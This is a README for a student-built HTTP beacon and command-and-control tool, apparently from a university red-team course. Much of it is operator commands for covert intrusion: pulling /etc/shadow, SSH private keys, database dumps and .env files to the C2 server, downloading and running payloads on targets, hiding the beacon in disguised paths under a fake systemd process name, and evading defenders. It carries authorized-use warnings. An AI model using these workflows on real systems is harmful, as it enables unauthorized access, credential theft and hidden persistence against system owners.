# HTTP Beacon - Red Team Command & Control Tool

A lightweight, feature-rich HTTP-based beacon for Red Team operations with command execution, file exfiltration, and payload delivery capabilities. Designed for authorized penetration testing and cybersecurity competitions.

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
  - [Starting the C2 Server](#starting-the-c2-server)
  - [Deploying Beacons](#deploying-beacons)
  - [C2 Commands](#c2-commands)
- [Operational Scenarios](#operational-scenarios)
- [Security & OpSec](#security--opsec)
- [Testing](#testing)
- [Troubleshooting](#troubleshooting)
- [Project Structure](#project-structure)
- [Credits](#credits)
- [License](#license)

## 🎯 Overview

This HTTP Beacon tool provides covert command and control through HTTP requests, enabling Red Teams to maintain persistent access to compromised systems during competitions and authorized testing. Built with operational security and ease of deployment in mind.

**Category:** Beacon/Callback Tool (Category 1)  
**Target OS:** Linux (Ubuntu/Debian tested, adaptable to others)  
**Language:** Python 3.6+  
**Deployment:** Manual or Ansible automation  

### Why This Tool?

In Red Team operations, maintaining reliable access to compromised systems is critical. This beacon provides:

- **Reliable C2 Communications** - HTTP-based callbacks work through most firewalls
- **File Operations** - Exfiltrate sensitive data and deliver additional payloads
- **Stealth Features** - Process obfuscation and timing jitter to avoid detection
- **Easy Deployment** - Ansible playbooks for rapid multi-target deployment
- **Operator-Friendly** - Interactive CLI interface for managing beacons

## ✨ Features

### Core Capabilities

✅ **Remote Command Execution** - Execute arbitrary shell commands on compromised targets  
✅ **File Exfiltration** - Upload files from target to C2 server (base64 encoded)  
✅ **Payload Delivery** - Download files from C2 to target systems  
✅ **System Information Gathering** - Automatic collection of target metadata  
✅ **Multi-Beacon Management** - Control multiple compromised systems simultaneously  

### Operational Features

✅ **Timing Jitter** - Random delays (±30%) to avoid predictable network patterns  
✅ **Process Obfuscation** - Disguises as `[systemd-update]` in process listings  
✅ **Persistent Storage** - All exfiltrated files saved to dedicated directory  
✅ **Command History** - Track all executed commands and results  
✅ **Interactive Interface** - User-friendly CLI for C2 operations  

### Deployment Features

✅ **Ansible Automation** - Automated deployment across multiple targets  
✅ **Configuration Files** - Easy customization via JSON config  
✅ **Multiple Install Locations** - Support for stealthy filesystem locations  
✅ **Cleanup Scripts** - Automated removal after operations  

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                     RED TEAM INFRASTRUCTURE                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌────────────────────────────────────────────────────────┐    │
│  │              C2 Server (c2_server.py)                  │    │
│  │                                                         │    │
│  │  • Flask REST API endpoints                           │    │
│  │  • Command queue management                           │    │
│  │  • Result collection & display                        │    │
│  │  • File storage (exfil + payloads)                   │    │
│  │  • Interactive operator interface                     │    │
│  └────────────────────────────────────────────────────────┘    │
│                            ▲                                     │
│                            │ HTTP/HTTPS                          │
│                            │ Check-ins                           │
└────────────────────────────┼─────────────────────────────────────┘
                             │
         ┌───────────────────┼───────────────────┐
         │                   │                   │
         ▼                   ▼                   ▼
┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
│  Target System  │  │  Target System  │  │  Target System  │
│                 │  │                 │  │                 │
│  ┌───────────┐  │  │  ┌───────────┐  │  │  ┌───────────┐  │
│  │beacon.py  │  │  │  │beacon.py  │  │  │  │beacon.py  │  │
│  │           │  │  │  │           │  │  │  │           │  │
│  │[systemd-  │  │  │  │[systemd-  │  │  │  │[systemd-  │  │
│  │ update]   │  │  │  │ update]   │  │  │  │ update]   │  │
│  └───────────┘  │  │  └───────────┘  │  │  └───────────┘  │
│                 │  │                 │  │                 │
│  Web Server     │  │  Database       │  │  App Server     │
└─────────────────┘  └─────────────────┘  └─────────────────┘
```

### Communication Flow

```
1. Beacon Check-in:
   Target → POST /checkin/{beacon_id} (with system info) → C2

2. Command Delivery:
   C2 → Response with command (if queued) → Target

3. Command Execution:
   Target executes command locally

4. Results Return:
   Target → POST /results/{beacon_id} (with output) → C2

5. File Operations:
   Upload:   Target → POST /upload/{beacon_id} → C2
   Download: Target → GET /download/{filename} → C2
```

## 💾 Installation

### Prerequisites

**C2 Server Requirements:**
- Python 3.6 or higher
- `requests` library
- `flask` library
- Open network port (default: 8080)

**Target System Requirements:**
- Python 3.6 or higher
- `requests` library
- Outbound HTTP access to C2 server
- No root/admin privileges required (user-level operation)

### Quick Setup (Virtual Environment - Recommended)

```bash
# Clone or download repository
cd ~/HTTP-Beacon-red-team-

# Create virtual environment
python3 -m venv venv

# Activate virtual environment
source venv/bin/activate  # Linux/macOS
# OR
venv\Scripts\activate  # Windows

# Install dependencies
pip install -r requirements.txt

# Verify installation
python3 tests/test-beacon.py
```

### System-Wide Installation

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install python3-requests python3-flask

# Or using pip (with system override on newer systems)
pip3 install requests flask --break-system-packages
```

### Verify Installation

```bash
# Check Python version
python3 --version  # Should be 3.6+

# Check libraries
python3 -c "import requests; import flask; print('All dependencies installed!')"

# Run test suite
python3 tests/test-beacon.py
```

## ⚙️ Configuration

### Basic Configuration File

Edit `config.json` to configure beacon behavior:

```json
{
    "c2_url": "http://192.168.1.100:8080",
    "check_in_interval": 60,
    "jitter_percent": 30,
    "timeout": 10,
    "beacon_id": "auto"
}
```

**Configuration Options:**

| Option | Description | Default | Recommended |
|--------|-------------|---------|-------------|
| `c2_url` | Full URL of C2 server | `http://127.0.0.1:8080` | Your C2 IP:port |
| `check_in_interval` | Seconds between check-ins | 30 | 60-120 for stealth |
| `jitter_percent` | Random timing variation (%) | 30 | 30-50 |
| `timeout` | HTTP request timeout (sec) | 10 | 10-30 |
| `beacon_id` | Custom beacon identifier | auto (uses hostname) | Custom or auto |

### Network Configuration

**Firewall Configuration (C2 Server):**

```bash
# Ubuntu/Debian with UFW
sudo ufw allow 8080/tcp

# Or for specific subnet only
sudo ufw allow from 192.168.1.0/24 to any port 8080

# CentOS/RHEL with firewalld
sudo firewall-cmd --add-port=8080/tcp --permanent
sudo firewall-cmd --reload
```

**Testing Connectivity:**

```bash
# From target, test C2 reachability
curl http://YOUR_C2_IP:8080

# Should return Flask 404 (confirms server is running)
```

### Stealthy Installation Paths

Recommended hidden locations for beacon installation:

```bash
# In-memory (no disk artifacts, lost on reboot)
/dev/shm/.systemd-update

# Temporary but persists
/tmp/.systemd-private
/var/tmp/.cache-update

# User directories (blends with normal config)
~/.config/systemd/user
~/.local/share/gnome-shell
~/.cache/mozilla
```

## 🚀 Usage

### Starting the C2 Server

```bash
cd ~/HTTP-Beacon-red-team-
python3 c2_server.py
```

**Expected Output:**
```
============================================================
Starting Enhanced HTTP Beacon C2 Server
============================================================
Listening on: http://0.0.0.0:8080
Exfiltrated files: ./exfiltrated_files/
Payloads directory: ./payloads/
============================================================

=== C2 Operator Interface ===

Commands:
  shell <beacon_id> <command>      - Execute shell command
  upload <beacon_id> <filepath>    - Exfiltrate file from target
  download <beacon_id> <file> <dest> - Drop payload on target
  sysinfo <beacon_id>              - Get detailed system info
  list                             - List active beacons
  beacons                          - Show beacon details
  results [count]                  - Show recent results
  files                            - List exfiltrated files
  payloads                         - List available payloads
  exit                             - Shutdown C2 server

Examples:
  shell beacon-victim whoami
  upload beacon-victim /etc/passwd
  download beacon-victim exploit.sh /tmp/update.sh
============================================================

C2> 
```

### Deploying Beacons

#### Method 1: Manual Deployment

```bash
# 1. Transfer beacon to target
scp beacon.py config.json user@target:/tmp/.systemd-update/

# 2. SSH to target
ssh user@target

# 3. Install dependencies (if needed)
pip3 install requests --break-system-packages

# 4. Start beacon
cd /tmp/.systemd-update/
nohup python3 beacon.py > /dev/null 2>&1 &

# 5. Verify it's running
ps aux | grep systemd-update
```

#### Method 2: Ansible Deployment (Recommended)

```bash
# 1. Edit inventory file
cd ansible
nano inventory.ini  # Add your targets

# 2. Deploy to all targets
ansible-playbook -i inventory.ini deploy-beacon.yml -k

# 3. Verify deployment
ansible -i inventory.ini all -m shell -a "pgrep -af beacon" -k
```

**See `ansible/README.md` for detailed deployment instructions.**

### C2 Commands

#### Shell Command Execution

```bash
# Basic commands
C2> shell beacon-webserver whoami
C2> shell beacon-webserver pwd
C2> shell beacon-webserver id

# System reconnaissance
C2> shell beacon-webserver uname -a
C2> shell beacon-webserver ip addr
C2> shell beacon-webserver cat /etc/os-release

# Process and network enumeration
C2> shell beacon-webserver ps aux
C2> shell beacon-webserver netstat -tulpn
C2> shell beacon-webserver ss -antp

# File system exploration
C2> shell beacon-webserver ls -la /home/
C2> shell beacon-webserver find /var/www -name "*.php"
C2> shell beacon-webserver cat /var/www/html/config.php

# Privilege escalation checks
C2> shell beacon-webserver sudo -l
C2> shell beacon-webserver find / -perm -4000 2>/dev/null
```

#### File Exfiltration (Upload)

```bash
# Exfiltrate sensitive files
C2> upload beacon-webserver /etc/passwd
C2> upload beacon-webserver /etc/shadow
C2> upload beacon-webserver /home/user/.ssh/id_rsa
C2> upload beacon-webserver /var/www/html/config.php

# Exfiltrate database dumps
C2> shell beacon-dbserver mysqldump -u root -p password123 database > /tmp/db.sql
C2> upload beacon-dbserver /tmp/db.sql

# List exfiltrated files
C2> files
```

**Exfiltrated files are saved to:** `./exfiltrated_files/`

#### Payload Delivery (Download)

```bash
# 1. First, place your payload in ./payloads/ directory
# (On your C2 machine)
$ cp exploit.sh ./payloads/
$ cp privilege-escalation.py ./payloads/

# 2. List available payloads
C2> payloads

# 3. Download to target
C2> download beacon-webserver exploit.sh /tmp/update.sh
C2> download beacon-webserver privilege-escalation.py /tmp/.hidden/priv.py

# 4. Execute downloaded payload
C2> shell beacon-webserver bash /tmp/update.sh
C2> shell beacon-webserver python3 /tmp/.hidden/priv.py
```

#### System Information

```bash
# Get detailed system info
C2> sysinfo beacon-webserver

# Returns JSON with:
# - hostname
# - platform (Linux, Windows, etc.)
# - platform_release (kernel version)
# - architecture (x86_64, ARM, etc.)
# - user (current user)
# - cwd (current working directory)
# - pid (beacon process ID)
```

#### Beacon Management

```bash
# List all active beacons
C2> list

# Show detailed beacon information
C2> beacons

# View recent command results
C2> results

# Show last 10 results
C2> results 10
```

## 📚 Operational Scenarios

### Scenario 1: Initial Compromise & Persistence

```bash
# 1. After exploiting web server vulnerability, establish beacon
scp beacon.py user@webserver:/tmp/.systemd-update/
ssh user@webserver
cd /tmp/.systemd-update/ && nohup python3 beacon.py &

# 2. Verify beacon check-in
C2> list

# 3. Gather system information
C2> sysinfo beacon-webserver
C2> shell beacon-webserver id
C2> shell beacon-webserver pwd

# 4. Enumerate the system
C2> shell beacon-webserver cat /etc/passwd
C2> shell beacon-webserver ls -la /home/
C2> shell beacon-webserver ps aux | grep -i sql
```

### Scenario 2: Privilege Escalation

```bash
# 1. Check for privilege escalation vectors
C2> shell beacon-webserver sudo -l
C2> shell beacon-webserver find / -perm -4000 2>/dev/null

# 2. Download privilege escalation script
C2> download beacon-webserver linpeas.sh /tmp/scan.sh

# 3. Execute and review results
C2> shell beacon-webserver bash /tmp/scan.sh > /tmp/results.txt
C2> upload beacon-webserver /tmp/results.txt

# 4. Review locally
$ cat ./exfiltrated_files/beacon-webserver_results.txt
```

### Scenario 3: Lateral Movement

```bash
# 1. Enumerate network
C2> shell beacon-webserver ip addr
C2> shell beacon-webserver cat /etc/hosts
C2> shell beacon-webserver arp -a

# 2. Find SSH keys for lateral movement
C2> shell beacon-webserver find /home -name "id_rsa" 2>/dev/null
C2> upload beacon-webserver /home/user/.ssh/id_rsa
C2> upload beacon-webserver /home/user/.ssh/known_hosts

# 3. Use Ansible to deploy to newly discovered hosts
$ ansible-playbook -i new-inventory.ini deploy-beacon.yml
```

### Scenario 4: Data Exfiltration

```bash
# 1. Locate sensitive data
C2> shell beacon-dbserver find /var/lib/mysql -name "*.sql"
C2> shell beacon-webserver grep -r "password" /var/www/html/

# 2. Exfiltrate database
C2> shell beacon-dbserver mysqldump -u root -pPASSWORD database > /tmp/data.sql
C2> upload beacon-dbserver /tmp/data.sql

# 3. Exfiltrate web configs
C2> upload beacon-webserver /var/www/html/wp-config.php
C2> upload beacon-webserver /var/www/html/.env

# 4. Review exfiltrated data
C2> files
$ ls -lh ./exfiltrated_files/
```

### Scenario 5: Competition Cleanup

```bash
# 1. Remove beacons gracefully
C2> shell beacon-webserver pkill -f beacon.py
C2> shell beacon-webserver rm -rf /tmp/.systemd-update/

# 2. Or use Ansible for multiple targets
$ ansible-playbook -i inventory.ini remove-beacon-fixed.yml -k

# 3. Verify cleanup
C2> list  # Should show no beacons
```

## 🔒 Security & OpSec

### Operational Security Considerations

#### What This Tool Creates (Detection Vectors)

**Network Traffic:**
- ✅ HTTP POST requests to C2 server (every ~60 seconds with jitter)
- ✅ Visible in packet captures (UNENCRYPTED - see limitations)
- ✅ Logged in web server access logs on C2

**File System Artifacts:**
- ✅ `beacon.py` file on disk
- ✅ `config.json` file on disk
- ✅ Python `.pyc` cache files (in `__pycache__/`)
- ⚠️ Located in hidden directory (e.g., `/tmp/.systemd-update/`)

**Process Listing:**
- ✅ Shows as `[systemd-update]` (obfuscated)
- ⚠️ Still visible in `ps aux | grep python`
- ⚠️ Shows full command line: `python3 beacon.py`

**System Logs:**
- ⚠️ May appear in syslog/journald (depending on logging level)
- ⚠️ Network connections visible in `netstat`/`ss` output

#### Detection Risk Assessment

| Risk Level | Detection Method | Mitigation |
|-----------|------------------|------------|
| 🔴 HIGH | Packet capture / IDS | Add HTTPS/TLS encryption (future) |
| 🔴 HIGH | Network flow analysis | Increase jitter, randomize intervals |
| 🟡 MEDIUM | Process listing monitoring | Compile to binary, use different name |
| 🟡 MEDIUM | File integrity monitoring | Use in-memory location (`/dev/shm`) |
| 🟢 LOW | Casual inspection | Process name obfuscation helps |

#### OpSec Best Practices

**1. Network Stealth**
```bash
# Use longer check-in intervals (trade-off: slower response)
"check_in_interval": 120  # 2 minutes

# Increase jitter for less predictability
"jitter_percent": 50  # ±50% variation
```

**2. File System Stealth**
```bash
# Use in-memory filesystem (no disk artifacts)
beacon_install_path: "/dev/shm/.systemd-update"

# Or blend with legitimate system directories
beacon_install_path: "/var/spool/.cups-update"
```

**3. Process Stealth**
```python
# Beacon already uses process name obfuscation
sys.argv[0] = '[systemd-update]'

# Future enhancement: Compile with PyInstaller
# pyinstaller --onefile --name systemd-update beacon.py
```

**4. Operational Security**
- ✅ Delete beacons after operations
- ✅ Rotate C2 server IP/port if detected
- ✅ Use HTTPS in production (requires SSL cert)
- ✅ Limit beacon activity during high-scrutiny periods
- ✅ Monitor Blue Team channels for detection indicators

### Current Limitations & Risks

**⚠️ CRITICAL LIMITATIONS:**

| Limitation | Impact | Workaround |
|-----------|--------|------------|
| **No Encryption** | Traffic visible in cleartext | Use VPN or add TLS |
| **No Authentication** | Anyone can control C2 | Restrict C2 access, add auth tokens |
| **HTTP Only** | Easily detected/blocked | Add HTTPS support |
| **No Persistence** | Lost on reboot | Add cron job / systemd service |

### Ethical Use & Legal Compliance

**⚠️ AUTHORIZED USE ONLY**

**This tool is ONLY for:**
- ✅ CSEC-473 Red Team competitions with authorization
- ✅ Systems you own or have written permission to test
- ✅ Isolated lab environments for educational purposes
- ✅ Authorized penetration testing engagements

**NEVER use this tool for:**
- ❌ Unauthorized access to any system
- ❌ RIT infrastructure without explicit authorization
- ❌ Other students' personal systems
- ❌ Any malicious or illegal activity

**Legal Warning:**  
Unauthorized computer access is illegal under the Computer Fraud and Abuse Act (18 U.S.C. § 1030) and similar laws worldwide. Violations can result in criminal prosecution, expulsion, and civil liability.

**By using this tool, you agree:**
1. You have proper authorization for all target systems
2. You understand the legal implications
3. You accept full responsibility for your actions
4. You will only use this for educational/authorized purposes

## 🧪 Testing

### Automated Test Suite

```bash
# Run all tests
python3 tests/test-beacon.py

# Expected output:
============================================================
HTTP Beacon Test Suite
============================================================

[TEST] Testing command execution...
✓ Echo command works
✓ Whoami command works: cyberrange
✓ Error handling works

[PASS] All command execution tests passed!

[TEST] Testing jitter...
✓ Jitter working: [52, 68, 61, 44, 73]
✓ Jitter within expected range

[PASS] All jitter tests passed!

============================================================
ALL TESTS PASSED!
============================================================
```

### Manual Testing Checklist

**Test 1: Basic Connectivity** ✓
```bash
# Terminal 1
python3 c2_server.py

# Terminal 2
python3 beacon.py

# Terminal 1
C2> list  # Should show beacon checked in
```

**Test 2: Command Execution** ✓
```bash
C2> shell beacon-<hostname> whoami
C2> shell beacon-<hostname> pwd
C2> shell beacon-<hostname> uname -a
# Wait for results (~60 seconds)
```

**Test 3: File Upload** ✓
```bash
# Create test file
$ echo "test data" > /tmp/test.txt

C2> upload beacon-<hostname> /tmp/test.txt
# Wait for upload
C2> files
$ ls ./exfiltrated_files/
```

**Test 4: File Download** ✓
```bash
# Create payload
$ echo "echo 'Payload works!'" > ./payloads/test.sh

C2> payloads
C2> download beacon-<hostname> test.sh /tmp/test.sh
# Wait for download
C2> shell beacon-<hostname> bash /tmp/test.sh
```

**Test 5: System Info** ✓
```bash
C2> sysinfo beacon-<hostname>
# Should return JSON with system details
```

**Test 6: Multiple Beacons** ✓
```bash
# Deploy to multiple targets
$ ansible-playbook -i inventory.ini deploy-beacon.yml -k

C2> list  # Should show all beacons
C2> shell beacon-target1 whoami
C2> shell beacon-target2 whoami
```

### Performance Testing

```bash
# Test beacon with different intervals
# Edit config.json:
"check_in_interval": 10  # Fast (10 seconds)
"check_in_interval": 60  # Normal (1 minute)
"check_in_interval": 300  # Slow/Stealthy (5 minutes)

# Measure command latency
# Time from command queue to result display
```

## 🔧 Troubleshooting

### Common Issues

#### Issue: Beacon Not Checking In

**Symptoms:** C2 server shows no beacons in `list` command

**Diagnosis:**
```bash
# 1. Verify beacon is running
ps aux | grep beacon
ps aux | grep systemd-update

# 2. Test C2 connectivity from target
curl http://YOUR_C2_IP:8080

# 3. Check firewall
sudo ufw status
```

**Solutions:**
```bash
# Allow C2 port
sudo ufw allow 8080/tcp

# Verify config.json has correct C2 URL
cat config.json

# Check beacon logs (run in foreground)
python3 beacon.py  # Watch for error messages
```

#### Issue: Commands Not Executing

**Symptoms:** Commands queued but no results appear

**Diagnosis:**
```bash
# 1. Verify beacon ID matches
C2> list  # Copy exact beacon ID
C2> shell <EXACT_ID> whoami  # Use copied ID

# 2. Check beacon is alive
C2> list  # Look at "Last seen" timestamp
```

**Solutions:**
```bash
# Wait for check-in interval (default 60 seconds)
# Beacon only checks for commands every ~60 seconds

# Reduce check-in interval for testing
# Edit config.json: "check_in_interval": 10

# Restart beacon to apply changes
pkill -f beacon.py
python3 beacon.py
```

#### Issue: File Upload Fails

**Symptoms:** Upload command returns error

**Diagnosis:**
```bash
# Verify file exists and is readable
C2> shell beacon-victim ls -la /path/to/file
C2> shell beacon-victim cat /path/to/file
```

**Solutions:**
```bash
# Check file permissions
C2> shell beacon-victim chmod +r /path/to/file
C2> upload beacon-victim /path/to/file

# Try smaller file first
C2> shell beacon-victim echo "test" > /tmp/test.txt
C2> upload beacon-victim /tmp/test.txt

# Check C2 server has write permissions
ls -ld ./exfiltrated_files/
chmod 755 ./exfiltrated_files/
```

#### Issue: File Download Fails

**Symptoms:** Download command returns "File not found"

**Diagnosis:**
```bash
# List available payloads
C2> payloads
```

**Solutions:**
```bash
# Verify payload exists in ./payloads/
ls -la ./payloads/

# Create missing payload
echo "test" > ./payloads/test.txt

# Try download again
C2> download beacon-victim test.txt /tmp/test.txt
```

#### Issue: Ansible Deployment Fails

**Symptoms:** `ansible-playbook` returns errors

**Solutions:**
```bash
# Test SSH connectivity first
ansible all -i inventory.ini -m ping -k

# Verify inventory syntax
cat inventory.ini

# Run with verbose output for debugging
ansible-playbook -i inventory.ini deploy-beacon.yml -vvv -k

# Check Python on target
ansible all -i inventory.ini -m shell -a "which python3" -k
```

#### Issue: Permission Denied Errors

**Symptoms:** Beacon can't write to install location

**Solutions:**
```bash
# Use user-writable location
beacon_install_path: "/tmp/.systemd-update"  # User-writable
# NOT: "/opt/.hidden"  # Requires root

# Or run Ansible with become: yes
ansible-playbook -i inventory.ini deploy-beacon.yml -k -K
```

### Debug Mode

**Run beacon in foreground to see errors:**
```bash
# Stop background beacon
pkill -f beacon.py

# Run in foreground
python3 beacon.py

# Watch output for errors
```

**Enable Flask debug mode (C2 server):**
```python
# In c2_server.py, change:
app.run(host='0.0.0.0', port=8080, debug=True)  # More verbose output
```

## 📁 Project Structure

```
redteam-tool/
├── README.md                       # This file - comprehensive documentation
├── beacon.py                       # Main beacon tool (runs on target)
├── c2_server.py                    # C2 server (runs on attack machine)
├── config.json                     # Beacon configuration file
├── requirements.txt                # Python dependencies
│
├── ansible/                        # Automated deployment
│   ├── deploy-beacon.yml          # Deploy beacons to targets
│   ├── remove-beacon-fixed.yml    # Remove beacons from targets
│   ├── inventory.ini              # Target system inventory
│   └── README.md                  # Ansible usage documentation
│
├── examples/                       # Usage examples
│   ├── example-output.txt         # Sample beacon/C2 output
│   └── example-config.json        # Sample configurations
│
├── tests/                          # Test suite
│   └── test-beacon.py             # Automated tests
│
├── docs/                           # Additional documentation
│   └── technical-details.md       # Technical implementation details
│
├── exfiltrated_files/             # Uploaded files from targets (created at runtime)
│   └── beacon-victim_passwd
│
└── payloads/                       # Files to download to targets (created at runtime)
    └── exploit.sh
```

## 🎓 Educational Value

This project demonstrates key Red Team concepts:

### Technical Skills Developed
- ✅ Network programming (HTTP client/server)
- ✅ Command & control architecture
- ✅ File encoding/decoding (base64)
- ✅ Process management and obfuscation
- ✅ Automation with Ansible
- ✅ Operational security considerations

### Red Team Concepts
- ✅ Beacon design patterns
- ✅ C2 infrastructure setup
- ✅ Covert channels and communication
- ✅ Timing jitter for stealth
- ✅ File exfiltration techniques
- ✅ Payload delivery methods

### Competition Preparation
- ✅ Rapid deployment capabilities
- ✅ Multi-target management
- ✅ Persistence and cleanup
- ✅ Operational workflow
- ✅ Team coordination

## 🙏 Credits & References

### Tools & Libraries
- **[Flask](https://flask.palletsprojects.com/)** - Lightweight web framework for C2 server
- **[Requests](https://requests.readthedocs.io/)** - HTTP library for beacon communication
- **[Ansible](https://www.ansible.com/)** - Automation framework for deployment

### Learning Resources
- **[MITRE ATT&CK Framework](https://attack.mitre.org/)** - Adversary tactics and techniques
- **Red Team Field Manual (RTFM)** - Quick reference for Red Team operations
- **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)** - Useful payloads and bypasses

### Inspiration
- **Metasploit Framework** - C2 architecture patterns
- **Empire/Covenant** - Beacon design concepts
- **Cobalt Strike** - Operational workflows

### Course Information
**Course:** CSEC-473 - Red Team Operations  
**Institution:** Rochester Institute of Technology  
**Assignment:** Custom Red Team Tool Development  
**Semester:** Spring 2024  

**Author:** [Your Name]  
**Email:** [your.email@rit.edu]  
**GitHub:** [your-github-username]  

## 📄 License

This tool is developed for educational purposes as part of CSEC-473 coursework at Rochester Institute of Technology.

**Educational Use License:**
- ✅ Use for CSEC-473 assignments and competitions
- ✅ Use for authorized penetration testing
- ✅ Study and learn from the code
- ✅ Modify for your own learning

**Restrictions:**
- ❌ No unauthorized computer access
- ❌ No malicious use
- ❌ No distribution for illegal purposes

By using this software, you agree to use it responsibly and ethically for authorized educational purposes only.

## 📞 Support

**For issues or questions:**

1. **Check troubleshooting section above**
2. **Review documentation in `/docs`**
3. **Run test suite:** `python3 tests/test-beacon.py`
4. **Contact course instructor or TA**

**Competition Support:**
- Team members: Coordinate via team Discord/Slack
- Grey Team: For rule clarifications
- Instructor: For tool functionality questions

---

**⚠️ Remember: This tool is for AUTHORIZED use only. Always get proper authorization before testing any system you don't own.**

**📚 For detailed technical implementation, see `docs/technical-details.md`**

**🤖 For automated deployment, see `ansible/README.md`**

---